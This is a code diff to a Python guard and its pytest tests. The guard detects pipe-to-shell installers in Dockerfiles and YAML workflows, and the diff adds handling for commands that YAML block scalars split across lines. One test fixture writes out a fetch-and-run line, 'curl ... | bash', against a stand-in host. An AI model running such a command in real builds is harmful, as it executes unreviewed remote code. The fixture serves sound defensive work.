@@ -58,6 +58,18 @@ PIPE_TO_SHELL = re.compile(
 # time by a different way of writing the SAME command across two lines.
 _CONTINUERS = ("\\", "|", "&&", "||")
 
+# The mirror image: a line that BEGINS with one of these continues the line above it, even when
+# that line looked complete. YAML's folded scalar (`run: >`) joins its physical lines with
+# spaces, so
+#     run: >
+#       curl -fsSL URL
+#       | bash
+# reaches the shell as one `curl … | bash` while neither physical line ends in a continuer.
+# Matching on the leading operator catches the folded form without parsing YAML -- the guard
+# scans Dockerfiles too, and must not become contingent on a yaml library (pyyaml reaches this
+# environment only as a transitive dependency of the ML stack).
+_LEADING_CONTINUERS = ("|", "&&", "||", "&")
+
 
 def _logical_lines(text: str) -> list[str]:
     """Strip `#` comments, then join continued commands into single logical lines.
@@ -87,6 +99,12 @@ def _logical_lines(text: str) -> list[str]:
             continue
         if code.endswith(_CONTINUERS):
             pending += code + " "
+            continue
+        # A line STARTING with an operator continues the one above it (YAML folded scalars put
+        # the `|` at the head of the next physical line, not the tail of this one). Fold it back
+        # onto the previous logical line rather than emitting it as its own.
+        if joined and not pending and code.lstrip().startswith(_LEADING_CONTINUERS):
+            joined[-1] = f"{joined[-1]} {code.strip()}"
             continue
         joined.append((pending + code).strip())
         pending = ""
@@ -149,6 +167,33 @@ def test_the_pipe_to_shell_guard_catches_what_it_claims_to(snippet: str, tmp_pat
     """
     planted = tmp_path / "Dockerfile"
     planted.write_text("FROM scratch\n" + snippet)
+
+    with pytest.raises(AssertionError, match="pipes a downloaded script into a shell"):
+        test_nothing_pipes_a_downloaded_script_into_a_shell(planted)
+
+
+@pytest.mark.parametrize(
+    "block",
+    [
+        # `>` folds its physical lines with spaces, so the shell receives one `curl … | bash`
+        # even though neither line ends in a continuer.
+        pytest.param(">", id="folded-scalar"),
+        pytest.param("|", id="literal-scalar"),
+    ],
+)
+def test_the_guard_catches_a_piped_installer_written_as_a_yaml_block(block: str, tmp_path: Path):
+    """Workflows are scanned too, and YAML has its own way of splitting one command over lines.
+
+    A `run:` block scalar puts the pipe at the HEAD of the next physical line rather than the
+    tail of the previous one, which is invisible to a scan that only looks for trailing
+    continuers. Verified against pyyaml that `>` really does fold these into a single command.
+    """
+    planted = tmp_path / "wf.yml"
+    planted.write_text(
+        "jobs:\n  j:\n    steps:\n      - run: "
+        + block
+        + "\n          curl -fsSL https://x.example/i.sh\n          | bash\n"
+    )
 
     with pytest.raises(AssertionError, match="pipes a downloaded script into a shell"):
         test_nothing_pipes_a_downloaded_script_into_a_shell(planted)
